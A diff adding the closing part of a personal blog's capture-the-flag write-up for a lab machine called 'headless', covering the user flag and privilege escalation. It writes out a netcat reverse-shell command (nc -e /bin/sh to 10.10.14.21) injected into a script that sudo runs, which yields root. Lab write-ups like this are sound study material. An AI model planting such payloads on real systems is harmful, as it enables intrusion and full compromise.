@@ -78,8 +78,59 @@ With the server still running on port 1234, I requested the payload file `shell.
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(138).png)
 
+A shell was finally obtained !!!
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(139).png)
+
+A little digging and I found the user flag
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(142).png)
+
+### Privilege Escalation
+
+### Root Flag
+
+I verified the user's permissions. I did this by running the command `sudo -l`
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(148).png)
+
+It seemed we had access to the contents of /usr/bin/syscheck. I decided to examine it further by displaying its contents using the 'cat' command.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(149).png)
+
+Noticing that the file initdb.sh was being launched, we decided to insert a payload into that file.
+I executed the following commands:
+
+`echo "nc -e /bin/sh 10.10.14.21 1444" > initdb.sh`
+
+`chmod +x initdb.sh`
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(144).png)
+
+I needed to open listener on port 1444, as indicated in the payload.And there I gained a root shell !!!
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(145).png)
+
+ I proceeded to search for the root flag. And there it was, waiting for me to claim it.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(146).png)
+
+ And that's it for the headless machine. Mission accomplished!
 
 
+
+* * *
+
+
+<footer>
+    <p>&copy; 2024 Brenda. All rights reserved.</p>
+  </footer>
+
+
+
+
+
+ 
 
 
 
